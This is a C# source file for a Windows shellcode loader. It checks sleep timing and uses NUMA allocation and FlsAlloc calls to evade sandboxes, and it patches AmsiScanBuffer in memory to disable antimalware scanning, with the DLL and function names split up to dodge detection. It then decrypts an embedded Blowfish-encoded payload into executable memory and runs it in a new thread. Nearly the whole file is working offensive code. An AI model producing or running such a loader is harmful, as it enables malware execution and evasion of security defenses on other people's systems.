using BlowFishDecrypt;
using System;
using System.Runtime.InteropServices;

namespace ConsoleApp1
{
    internal class MyApp
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, 
            uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, 
            UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr FlsAlloc(IntPtr callback);

        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
        static extern void MoveMemory(IntPtr dest, IntPtr src, int size);


        static void Main(string[] args)
        {
            DateTime t1 = DateTime.Now;
            Sleep(4000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 3.5)
            {
                return;
            }

            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            IntPtr ptrCheck = FlsAlloc(IntPtr.Zero);
            if (ptrCheck == null) 
            {
                return;
            }

            patch();

            byte[] buf = new byte[640] { 0x52, 0x0f, 0x54, 0xf8, 0xdb, 0xeb, 0x4c, 0xad, 0x0b, 0xed, 0xe2, 0xd9, 0x4c, 0x36, 0x0c, 0x10, 0x23, 0x4a, 0x95, 0x89, 0xe8, 0x57, 0xf7, 0x83, 0xcc, 0x45, 0xf6, 0x5a, 0x4f, 0x95, 0x74, 0x50, 0xdd, 0x91, 0x78, 0xe1, 0x3c, 0x21, 0x21, 0xe9, 0x89, 0x70, 0x87, 0xa2, 0xca, 0xeb, 0xde, 0x31, 0x8a, 0x54, 0xfd, 0xe4, 0x5d, 0xaf, 0x20, 0x51, 0xa9, 0x1e, 0x67, 0xfa, 0xe2, 0x18, 0xf9, 0x49, 0x65, 0x3a, 0x7b, 0x66, 0x39, 0xf5, 0x2d, 0xa1, 0xf6, 0xc0, 0x4a, 0xcc, 0x27, 0x43, 0x33, 0xf5, 0x0c, 0x9a, 0x4b, 0x07, 0xf7, 0x30, 0x55, 0x5d, 0x38, 0x82, 0xa6, 0xd4, 0x88, 0x07, 0xe1, 0x0e, 0x2b, 0x46, 0xc4, 0x02, 0x27, 0x0e, 0x88, 0xea, 0x50, 0x2b, 0x42, 0xa0, 0xbd, 0xf8, 0x2c, 0xe8, 0x53, 0x44, 0x79, 0x9b, 0x1c, 0x1d, 0x8b, 0xd5, 0x3a, 0x1a, 0x87, 0x86, 0x10, 0xeb, 0xc2, 0x52, 0x16, 0x27, 0xe0, 0xb7, 0x2b, 0xc7, 0x23, 0xe2, 0xd2, 0xcd, 0x50, 0x2f, 0xed, 0x68, 0x0f, 0x55, 0xe6, 0xb9, 0x6f, 0x60, 0xe4, 0xb4, 0xe7, 0x9c, 0x97, 0x62, 0x81, 0x36, 0xe5, 0x80, 0xcd, 0x2e, 0x95, 0x84, 0xef, 0x89, 0xd0, 0xc3, 0x74, 0x03, 0x77, 0xf4, 0xd3, 0xde, 0xe6, 0x96, 0x38, 0xc8, 0x35, 0x7b, 0xe8, 0x27, 0x8e, 0xc2, 0xcb, 0x70, 0x1b, 0x98, 0x60, 0x7f, 0x70, 0xb6, 0xcd, 0xc0, 0x0b, 0x49, 0xba, 0xda, 0x99, 0xb8, 0xc2, 0x86, 0x56, 0x5d, 0x48, 0x26, 0xc1, 0x33, 0xd3, 0xbe, 0x7a, 0x8e, 0xb0, 0x6a, 0x7a, 0x5c, 0xf1, 0x24, 0x8a, 0x00, 0x97, 0x89, 0x04, 0x55, 0x1e, 0xc9, 0x8b, 0xe9, 0x70, 0xb6, 0x84, 0x02, 0xd4, 0x4d, 0xf8, 0x98, 0xfc, 0x1d, 0x94, 0x89, 0x91, 0x02, 0x56, 0xe6, 0xf3, 0xf5, 0x3a, 0xa0, 0xe7, 0xe8, 0x49, 0x22, 0xc8, 0xc3, 0x6f, 0x03, 0x34, 0xce, 0x2f, 0xaf, 0xd3, 0xc9, 0xda, 0x64, 0xac, 0xc4, 0x7e, 0xf0, 0xb2, 0x58, 0x05, 0x31, 0xa4, 0x0a, 0xf7, 0x8f, 0xa0, 0x6c, 0x01, 0x79, 0xbe, 0xc0, 0x37, 0xaa, 0x4d, 0xd0, 0xba, 0xca, 0x98, 0xa1, 0xb2, 0xf3, 0x2b, 0x20, 0x37, 0xd3, 0xc2, 0xf4, 0x80, 0xec, 0xa9, 0x8a, 0x76, 0x63, 0x96, 0xe8, 0x2c, 0x10, 0x7b, 0xb9, 0x18, 0x07, 0x49, 0x36, 0x56, 0xc6, 0x1a, 0x0a, 0x68, 0x05, 0x44, 0x00, 0x8b, 0x8f, 0x50, 0x24, 0x04, 0x26, 0x3d, 0x96, 0x7c, 0xa7, 0x39, 0x07, 0xd2, 0x03, 0x19, 0xce, 0x97, 0x36, 0x14, 0x1b, 0xa7, 0xcd, 0x61, 0x9a, 0x0c, 0x51, 0xc4, 0xbc, 0x83, 0x8a, 0xf8, 0x97, 0xf8, 0x46, 0xec, 0x1c, 0x62, 0x19, 0x24, 0x7e, 0xdf, 0x25, 0x44, 0x27, 0xd6, 0xc1, 0x6a, 0x55, 0x24, 0x28, 0x75, 0x46, 0x1d, 0x55, 0x4b, 0x72, 0x02, 0xd5, 0x15, 0xbc, 0x08, 0x60, 0x2e, 0x4d, 0x74, 0xb9, 0xed, 0x63, 0xb0, 0xd7, 0x81, 0x41, 0xc4, 0xf3, 0x61, 0x2d, 0x88, 0xf2, 0xe2, 0x9c, 0x9a, 0xf7, 0x76, 0xe0, 0x19, 0x4d, 0x62, 0x8c, 0x30, 0x76, 0xa4, 0x5b, 0x3e, 0x49, 0x65, 0x03, 0x74, 0xdd, 0xc3, 0x66, 0xeb, 0x78, 0xa2, 0x60, 0x6e, 0x69, 0x01, 0x3a, 0x62, 0x44, 0xc0, 0x00, 0xb6, 0x3f, 0x53, 0x8c, 0x31, 0xec, 0x28, 0xbb, 0x6f, 0xb2, 0x85, 0x66, 0x6d, 0xc6, 0x59, 0x4b, 0x47, 0x94, 0x7c, 0xb3, 0x5c, 0x8d, 0x8e, 0xb1, 0x7b, 0xac, 0x65, 0x2f, 0xff, 0xed, 0x84, 0x49, 0xf2, 0x37, 0x48, 0x2d, 0x18, 0x39, 0x1f, 0x78, 0x14, 0x81, 0x13, 0x93, 0x69, 0xf5, 0x62, 0x30, 0x9a, 0x96, 0xe8, 0xd3, 0x78, 0xfa, 0xa4, 0xa6, 0xa9, 0xfa, 0x9c, 0x2d, 0x85, 0x54, 0xb8, 0xb2, 0x7f, 0x55, 0x52, 0x84, 0x09, 0x95, 0xcb, 0x64, 0x72, 0x68, 0xf0, 0x26, 0x0d, 0x4d, 0xdc, 0x0b, 0xa8, 0x08, 0x7e, 0x4c, 0x41, 0x34, 0x06, 0x90, 0x0e, 0xe4, 0xd3, 0x53, 0x82, 0x70, 0x4a, 0x7d, 0x66, 0xb8, 0x7a, 0xd8, 0xa1, 0x81, 0xf7, 0xf4, 0xb6, 0xd3, 0xe6, 0x9c, 0x12, 0x55, 0x01, 0xfe, 0x50, 0x3d, 0xc0, 0xe2, 0xd0, 0x6d, 0x00, 0x63, 0x11, 0x9d, 0x47, 0xda, 0x50, 0x8f, 0x57, 0xa3, 0xb0, 0xd9, 0x42, 0x24, 0xbe, 0x5f, 0x4a, 0xaf, 0x72, 0x63, 0x4c, 0x93, 0x04, 0xa7, 0x24, 0x83, 0x83, 0x5a, 0x2b, 0xb2, 0x87, 0x6b, 0x9f, 0x9e, 0x02, 0x8a, 0xf4, 0x06, 0x4b, 0xd8, 0x68, 0x70, 0xf4, 0x75, 0xf9, 0x22, 0x3f, 0x19, 0xc9, 0x53, 0x66, 0x6f, 0x67, 0xf8, 0xa0, 0x41, 0xa7, 0x0f, 0xd3, 0x6e, 0x20, 0xb6, 0x8b, 0x06, 0xa9, 0x7e, 0xc3, 0xac, 0xd1, 0xe5, 0xce, 0x69, 0xef, 0x2c, 0x83, 0x0b, 0x64, 0x1b, 0xdf, 0xd6, 0x7a, 0xd1, 0xb3, 0x95, 0x11, 0x5d, 0x23, 0x68, 0xd1, 0x5e };

            //for (int i = 0; i < buf.Length; i++)
            //{
            //    buf[i] = (byte)(((uint)buf[i] - 17) & 0xFF);
            //}


            //byte[] xorKey = new byte[5] { 0x70, 0x37, 0x51, 0x44, 0x6a };
            //for (int i = 0; i < buf.Length; i++)
            //{
            //    buf[i] = (byte)((uint)buf[i] ^ xorKey[i % xorKey.Length]);
            //}

            BlowMe bm = new BlowMe();
            buf = bm.Decode(buf, 640);

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr,
                IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }

        private static void patch()
        {
            IntPtr TargetDLL = LoadLibrary("a" + "m" + "s" + "i" + ".dll");
            if (TargetDLL == IntPtr.Zero)
            {
                Console.WriteLine("ERROR: Could not retrieve pointer!");
                return;
            }

            IntPtr BufrPtr = GetProcAddress(TargetDLL, "Ams" + "iSc" + "anBu" + "ffer");
            if (BufrPtr == IntPtr.Zero)
            {
                Console.WriteLine("ERROR: Could not retrieve function pointer!");
                return;
            }

            UIntPtr dwSize = (UIntPtr)3;
            uint Zero = 0;

            if (!VirtualProtect(BufrPtr, dwSize, 0x40, out Zero))
            {
                Console.WriteLine("ERROR: Could not modify memory permissions!");
                return;
            }
            //Console.WriteLine("Success: We modified memory permissions!");

            byte[] p = new byte[12] { 0xb8, 0x34, 0x12, 0x07, 0x80, 0x66, 0xb8, 0x32, 0x00, 0xb0, 0x57, 0xc3 };

            IntPtr unmanagedPointer = Marshal.AllocHGlobal(12);

            Marshal.Copy(p, 0, unmanagedPointer, 12);

            MoveMemory(BufrPtr, unmanagedPointer, 12);

            if (!VirtualProtect(BufrPtr, dwSize, 0x20, out Zero))
            {
                Console.WriteLine("ERROR: Could not modify memory permissions!");
                return;
            }
            //Console.WriteLine("Success, function patched! :)");
            return;
        }
    }
}
